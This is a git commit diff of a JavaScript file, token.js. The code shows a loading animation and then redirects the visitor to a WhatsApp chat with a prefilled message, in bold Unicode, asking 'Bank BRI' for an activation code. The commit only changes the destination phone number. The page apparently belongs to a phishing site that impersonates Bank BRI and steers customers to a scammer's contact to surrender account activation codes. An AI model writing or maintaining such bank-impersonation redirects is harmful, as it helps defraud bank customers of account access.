8f40ebee4a394ded33192b64efa776da018be7c2
hostingfree <gopay882@gmail.com>
2024-10-02 16:28:30 +0700

    Update token.js

--- token.js
+++ token.js
@@ -8,7 +8,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://wa.me/6285283264546?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20Request%20Kode%20Aktivasi';
+location.href='https://wa.me/6285189574886?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20Request%20Kode%20Aktivasi';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
